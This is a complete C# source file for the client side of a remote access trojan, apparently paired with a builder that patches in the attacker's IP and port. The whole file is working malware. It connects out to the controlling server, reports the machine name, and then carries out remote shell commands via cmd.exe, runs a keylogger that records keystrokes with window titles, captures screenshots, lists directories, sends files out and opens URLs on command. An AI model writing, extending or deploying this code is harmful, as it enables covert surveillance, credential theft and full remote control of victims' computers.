using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using System.Xml.Linq;

namespace sobolanul
{
    internal class Program
    {
        #region placeholders
        // bytes placeholders for ip & port, meant to be byte patched by the server  builder
        // "IP_PLACEHOLDER_______________________________________________"
        private static readonly byte[] svIpBytes =
        {
            
            0x49, 0x50, 0x5F, 0x50, 0x4C, 0x41, 0x43, 0x45, 0x48, 0x4F, 0x4C, 0x44, 0x45, 0x52,
            0x5F, 0x5F, 0x5F, 0x5F, 0x5F, 0x5F, 0x5F, 0x5F, 0x5F, 0x5F, 0x5F, 0x5F, 0x5F, 0x5F,
            0x5F, 0x5F, 0x5F, 0x5F, 0x5F, 0x5F, 0x5F, 0x5F, 0x5F, 0x5F, 0x5F, 0x5F, 0x5F, 0x5F,
            0x5F, 0x5F, 0x5F, 0x5F, 0x5F, 0x5F, 0x5F, 0x5F, 0x5F, 0x5F, 0x5F, 0x5F, 0x5F, 0x5F,
            0x5F, 0x5F, 0x5F, 0x5F, 0x5F, 0x5F, 0x5F, 0x5F
        };

        // PORTPLAC
        private static readonly byte[] svPortBytes =
        {
            0x50, 0x4F, 0x52, 0x54, 0x50, 0x4C, 0x41, 0x43
        };
        #endregion
        #region winapi
        [DllImport("User32.dll")]
        public static extern short GetAsyncKeyState(int vKey); // check if a key is pressed 

        [DllImport("User32.dll")]
        public static extern IntPtr GetForegroundWindow(); // return an id for that active window

        [DllImport("user32.dll")]
        private static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int nIndex); // get the title based on idWindow

        [DllImport("user32.dll")]
        public static extern int GetCursorPos(out POINT lpPoint);

        public struct POINT
        {
            public int X;
            public int Y;
        }
        #endregion
        #region parsing
        // parse ip and port and runtime from the patched bytes
        public static string GetIP()
        {
            int nullPos = Array.IndexOf(svIpBytes, (byte)0);
            if (nullPos < 0) nullPos = svIpBytes.Length;
            return Encoding.ASCII.GetString(svIpBytes, 0, nullPos);
        }

        public static int GetPort()
        {
            int nullPos = Array.IndexOf(svPortBytes, (byte)0);
            if (nullPos < 0) nullPos = svPortBytes.Length;
            string portString = Encoding.ASCII.GetString(svPortBytes, 0, nullPos);

            // fallback
            if (!int.TryParse(portString, out int portValue))
                portValue = 7777;
            return portValue;
        }
        #endregion

        private static bool keyloggerActive = false;
        private static Thread keyloggerThread = null;
        private static HashSet<int> pressedKeys = new HashSet<int>();
        static void Main(string[] args)
        {
            try
            {
                TcpClient client = new TcpClient(GetIP(), GetPort());
                NetworkStream stream = client.GetStream();

                // send pc name on connect
                string machineName = Environment.MachineName;
                SendData(stream, "info", machineName);

                // process incoming commands
                while (true)
                {
                    byte[] buffer = new byte[1024];
                    int bytesRead = stream.Read(buffer, 0, buffer.Length);
                    if (bytesRead <= 0) break;

                    string commandXml = Encoding.UTF8.GetString(buffer, 0, bytesRead).Trim();
                    ProcessCommand(stream, commandXml);
                }
                client.Close();
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
            }
        }

        // xml is used to send and read data
        static void ProcessCommand(NetworkStream stream, string commandXml)
        {
            try
            {
                XDocument xml = XDocument.Parse(commandXml);
                if (xml.Root == null) return;

                switch (xml.Root.Name.LocalName)
                {
                    case "execute":
                        {
                            string output = ExecuteCommand(xml.Root.Value);
                            SendData(stream, "execute", output);
                        }
                        break;
                    case "keylogger":
                        {
                            keyloggerActive = !keyloggerActive;
                            if (keyloggerActive)
                            {
                                if (keyloggerThread == null || !keyloggerThread.IsAlive)
                                {
                                    keyloggerThread = new Thread(() => KeyLog(stream)) { IsBackground = true };
                                    keyloggerThread.Start();
                                }
                            }
                            else
                            {
                                keyloggerThread?.Join();
                                keyloggerThread = null;
                            }
                        }
                        break;
                    case "displays":
                        {
                            ListDisplays(stream);
                        }
                        break;
                    case "screenshot":
                        {
                            XAttribute idxAttr = xml.Root.Attribute("index");
                            int index = 0;
                            if (idxAttr != null) int.TryParse(idxAttr.Value, out index);
                            CaptureAndSendScreenshot(stream, index);
                        }
                        break;
                    case "listdir":
                        {
                            string requestedPath = xml.Root.Value.Trim();
                            ListDirectory(stream, requestedPath);
                            break;
                        }
                    case "download":
                        {
                            string filePath = xml.Root.Value.Trim();
                            SendFile(stream, filePath);
                        }
                        break;
                    case "openurl":
                        {
                            string url = xml.Root.Value.Trim();
                            OpenUrl(url);
                        }
                        break;
                    case "exit":
                        {
                            Environment.Exit(0);
                        }
                        break;
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error processing XML command: " + ex.Message);
            }
        }

        // open url using the system's default browser
        private static void OpenUrl(string url)
        {
            if (!url.StartsWith("http://") && !url.StartsWith("https://"))
            {
                url = "http://" + url;
            }
            try
            {
                var psi = new ProcessStartInfo
                {
                    FileName = url,
                    UseShellExecute = true
                };
                Process.Start(psi);
            }
            catch (Exception ex)
            {
                
            }
        }

        static string ExecuteCommand(string command)
        {
            var proc = new Process
            {
                StartInfo = new ProcessStartInfo
                {
                    FileName = "cmd.exe",
                    Arguments = "/c " + command,
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                    UseShellExecute = false,
                    CreateNoWindow = true
                }
            };
            proc.Start();

            string output = proc.StandardOutput.ReadToEnd();
            string error = proc.StandardError.ReadToEnd();
            proc.WaitForExit();

            return !string.IsNullOrWhiteSpace(error) ? "[ERROR] " + error : output;
        }

        static void ListDisplays(NetworkStream stream)
        {
            var screens = Screen.AllScreens;
            var sb = new StringBuilder();
            for (int i = 0; i < screens.Length; i++)
            {
                var scr = screens[i];
                sb.AppendFormat("<display index=\"{0}\">{1}x{2}</display>", i, scr.Bounds.Width, scr.Bounds.Height);
            }
            SendData(stream, "displays", sb.ToString());
        }

        static void CaptureAndSendScreenshot(NetworkStream stream, int screenIndex)
        {
            var screens = Screen.AllScreens;
            if (screenIndex < 0 || screenIndex >= screens.Length) screenIndex = 0;
            var bounds = screens[screenIndex].Bounds;

            using (var bmp = new Bitmap(bounds.Width, bounds.Height))
            {
                using (var g = Graphics.FromImage(bmp))
                {
                    g.CopyFromScreen(bounds.Left, bounds.Top, 0, 0, bounds.Size);
                }
                using (var ms = new MemoryStream())
                {
                    bmp.Save(ms, ImageFormat.Png);
                    byte[] pngBytes = ms.ToArray();
                    SendData(stream, "screenshotResponse", Convert.ToBase64String(pngBytes));
                }
            }
        }

        static void KeyLog(NetworkStream stream)
        {
            string lastWindow = "";
            var keyLogs = new StringBuilder();
            var currentInput = new StringBuilder();

            GetCursorPos(out POINT lastMousePos);

            while (keyloggerActive)
            {
                Thread.Sleep(50);

                IntPtr hWnd = GetForegroundWindow();
                var windowText = new StringBuilder(256);
                if (GetWindowText(hWnd, windowText, 256) > 0)
                {
                    string currentWindow = windowText.ToString();
                    if (currentWindow != lastWindow)
                    {
                        lastWindow = currentWindow;
                        if (currentInput.Length > 0)
                        {
                            keyLogs.AppendLine(currentInput.ToString());
                            currentInput.Clear();
                        }
                        keyLogs.AppendLine($"\n[{currentWindow}]");
                    }
                }

                GetCursorPos(out POINT currentMousePos);
                if (currentMousePos.X != lastMousePos.X || currentMousePos.Y != lastMousePos.Y)
                {
                    if (currentInput.Length > 0)
                    {
                        keyLogs.AppendLine(currentInput.ToString());
                        currentInput.Clear();
                    }
                    lastMousePos = currentMousePos;
                }

                for (int i = 8; i <= 255; i++)
                {
                    short keyState = GetAsyncKeyState(i);
                    if ((keyState & 0x8000) != 0)
                    {
                        if (!pressedKeys.Contains(i))
                        {
                            pressedKeys.Add(i);
                            string keyStroke = ConvertKeyCode(i);
                            if (keyStroke == "[ENTER]" || keyStroke == "[TAB]")
                            {
                                keyLogs.AppendLine(currentInput.ToString());
                                currentInput.Clear();
                            }
                            else
                            {
                                currentInput.Append(keyStroke);
                            }
                        }
                    }
                    else
                    {
                        pressedKeys.Remove(i);
                    }
                }

                if (keyLogs.Length > 0)
                {
                    SendData(stream, "keylogger", keyLogs.ToString());
                    keyLogs.Clear();
                }
            }
        }

        static string ConvertKeyCode(int keyCode)
        {
            switch (keyCode)
            {
                case 13: return "[ENTER]";
                case 8: return "[BACKSPACE]";
                case 9: return "[TAB]";
                case 17: return "[CTRL]";
                case 16: return "[SHIFT]";
                case 18: return "[ALT]";
                case 27: return "[ESC]";
                case 32: return " ";
                default:
                    return ((char)keyCode).ToString();
            }
        }

        static void ListDirectory(NetworkStream stream, string path)
        {
            try
            {
                var dirs = Directory.GetDirectories(path);
                var files = Directory.GetFiles(path);
                var sb = new StringBuilder();
                foreach (var d in dirs)
                {
                    string folderName = Path.GetFileName(d);
                    sb.AppendFormat("<folder name=\"{0}\" />", folderName);
                }
                foreach (var f in files)
                {
                    string fileName = Path.GetFileName(f);
                    fileName = fileName.Replace("&", "&amp;").Replace("<", "&lt;").Replace(">", "&gt;");
                    sb.AppendFormat("<file name=\"{0}\" size=\"{1}\" />", fileName, new FileInfo(f).Length);
                }
                SendData(stream, "dirlist", sb.ToString());
            }
            catch (Exception ex)
            {
                SendData(stream, "dirlist", "[ERROR] " + ex.Message);
            }
        }

        static void SendFile(NetworkStream stream, string filePath)
        {
            try
            {
                byte[] fileBytes = File.ReadAllBytes(filePath);
                string base64File = Convert.ToBase64String(fileBytes);
                string fileName = Path.GetFileName(filePath);

                string payload = $"<filedata name=\"{fileName}\">{base64File}</filedata>";
                SendData(stream, "filedata", payload);
            }
            catch (Exception ex)
            {
                SendData(stream, "filedata", "[ERROR] " + ex.Message);
            }
        }

        static void SendData(NetworkStream stream, string tag, string content)
        {
            string xmlMessage = $"<{tag}>{content}</{tag}>";
            byte[] data = Encoding.UTF8.GetBytes(xmlMessage);
            stream.Write(data, 0, data.Length);
            stream.Flush();
        }
    }
}
